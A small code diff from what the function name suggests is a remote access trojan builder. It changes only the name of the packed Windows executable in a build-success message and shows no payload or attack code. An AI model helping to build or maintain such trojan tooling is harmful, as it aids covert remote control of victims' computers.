@@ -83,7 +83,7 @@ def rat_builder_init():
 
         if process.returncode == 0:
             print(Colorate.Horizontal(_cl["head"], f"  [+] Build successful! All modules packed."))
-            print(Colorate.Horizontal(_cl["head"], f"  [+] EXE located in: {output_dir}/navi.exe"))
+            print(Colorate.Horizontal(_cl["head"], f"  [+] EXE located in: {output_dir}/insomnia.exe"))
         else:
             print(Colorate.Horizontal(_cl["num"], "  [-] Build failed! Detailed PyInstaller Errors:"))
             print(process.stderr)
